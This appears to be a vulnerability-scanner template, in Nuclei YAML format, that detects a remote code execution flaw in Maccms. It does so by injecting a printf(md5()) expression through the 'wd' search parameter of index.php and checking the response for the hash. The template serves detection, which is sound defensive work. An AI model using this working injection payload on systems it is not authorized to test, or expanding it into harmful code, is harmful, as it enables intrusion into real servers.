id: poc-yaml-maccms-rce
info:
  name: Maccms Remote Code Execution Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: rce
  description: |
    Detects a remote code execution vulnerability in Maccms
variables:
  r: "{{rand_int(10000, 21000)}}"
http:
  - method: GET
    path:
      - "/index.php?m=vod-search&wd={{concat('if-A:printf(md5(',r,'))endif-A')}}"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{md5(r)}}"
